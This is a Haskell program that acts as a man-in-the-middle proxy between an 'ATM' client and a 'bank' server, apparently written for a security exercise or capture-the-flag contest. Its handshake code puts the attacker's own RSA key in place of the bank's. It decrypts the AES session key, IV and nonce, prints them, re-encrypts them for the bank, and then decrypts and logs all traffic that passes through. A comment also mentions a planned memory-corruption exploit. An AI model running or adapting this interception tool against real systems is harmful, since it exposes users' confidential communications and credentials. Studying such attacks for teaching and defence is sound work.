-- Hackage dependencies: asn1-encoding cryptonite network
{-# LANGUAGE NoMonomorphismRestriction, OverloadedStrings #-}
import Control.Applicative
import Control.Concurrent
import Control.Monad
import Crypto.Cipher.AES
import Crypto.Cipher.Types
import Crypto.Error
import Crypto.Hash.Algorithms
import Crypto.PubKey.RSA
import Crypto.PubKey.RSA.OAEP
import Crypto.Random
import Data.ASN1.BinaryEncoding
import Data.ASN1.BitArray
import Data.ASN1.Encoding
import Data.ASN1.Types
import Data.Char
import Data.Maybe
import Data.Word
import Network
import Network.Socket.ByteString
import System.Environment
import System.IO
import qualified Data.ByteString as B
import qualified Data.ByteString.Char8
import qualified Data.ByteString.Lazy as L

readMaybe = fmap fst . listToMaybe . reads

lToStrict = B.concat . L.toChunks

port = PortNumber . fromIntegral
unPort (PortNumber x) = x

main = withSocketsDo $ fmap (map readMaybe) getArgs >>= main'

main' [Just atmPort, Just bankPort] = main'' (port atmPort) (port bankPort)
main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BANK_PORT"

main'' atmPort bankPort = do
    listener <- listenOn atmPort
    forever $ accept listener >>= forkIO . doMitm bankPort

dumbProxy atm bank logTo logFrom = loop where
    bufferSize = 4096
    loop = do
        atmEOF <- hIsEOF atm
        unless atmEOF $ do
            B.hGetSome atm bufferSize >>= logTo >>= B.hPut bank
            bankEOF <- hIsEOF bank
            unless bankEOF $ do
                B.hGetSome bank bufferSize >>= logFrom >>= B.hPut atm
                loop

expect h s = do
    s' <- B.hGetSome h (B.length s)
    unless (s == s') $ error "expect: unexpected input"

decodeX509Pubkey :: L.ByteString -> Maybe PublicKey
decodeX509Pubkey x = case decodeASN1 BER x of
    Right [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray size s), End Sequence] ->
            case decodeASN1 BER (L.fromChunks [s]) of
                Right [Start Sequence, IntVal n, IntVal e, End Sequence] ->
                    Just (PublicKey (fromIntegral size `div` 8) n e)
                _ -> Nothing
    _ -> Nothing

encodeX509Pubkey :: PublicKey -> B.ByteString
encodeX509Pubkey (PublicKey size n e) = lToStrict $ encodeASN1 DER [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray (fromIntegral size) s), End Sequence] where
    s = lToStrict $ encodeASN1 DER [Start Sequence, IntVal n, IntVal e, End Sequence]

mitmHandshake atm bank logTo logFrom = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    expect atm "DUMMY"
    B.hPut bank "DUMMY"
    bankPubRaw <- B.hGetSome bank bufferSize
    --logFrom bankPubRaw
    (mitmPub, mitmPriv) <- generate (pubSizeBits `div` 8) 0x10001
    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
    --print bankPub
    --print mitmPub
    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
    B.hPut atm (encodeX509Pubkey mitmPub)
    encAES <- B.hGetSome atm bufferSize
    --logTo encAES
    let Right rawAES = decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encAES
    putStr "Raw AES key: "
    print $ rawAES
    let Right aes = eitherCryptoError $ cipherInit rawAES
    Right mitmAES <- encrypt (defaultOAEPParams SHA1) bankPub' rawAES
    B.hPutStr bank mitmAES -- TODO: memory corruption exploit
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encIV <- B.hGetSome atm bufferSize
    let Right rawIV = decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encIV
    putStr "Raw AES IV: "
    print $ rawIV
    Right mitmIV <- encrypt (defaultOAEPParams SHA1) bankPub' rawIV
    B.hPutStr bank mitmIV
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encNonce <- B.hGetSome atm bufferSize
    let Just aesIV = makeIV rawIV
    let rawNonce = cfbDecrypt (aes :: AES128) aesIV encNonce
    putStr "Raw Initial Nonce: "
    print rawNonce
    let mitmNonce = cfbEncrypt (aes :: AES128) aesIV rawNonce
    B.hPutStr bank mitmNonce
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    return (aes, aesIV)

passiveMitm atm bank logTo logFrom aes aesIv = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
    bufferSize = 4096
    wrap log ctxt = do
        let ptxt = cfbDecrypt (aes :: AES128) aesIv ctxt
        let split' c = B.split (fromIntegral $ ord c)
        log ptxt
        print . map (split' ';') . split' ':' $ ptxt
        return ctxt

doMitm bankPort (atm, host, atmPort) = do
    putStrLn $ "Received a connection from " ++ host ++ ":" ++ show atmPort
    putStrLn $ "Forwarding to localhost:" ++ show (unPort bankPort)
    bank <- connectTo "localhost" bankPort
    let log p q s = (putStrLn $ show p ++ " -> " ++ show q ++ ": " ++ show s) >> return s
    let logTo = log atmPort (unPort bankPort) :: B.ByteString -> IO B.ByteString
    let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
    --dumbProxy atm bank logTo logFrom
    (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
    passiveMitm atm bank logTo logFrom aes aesIV
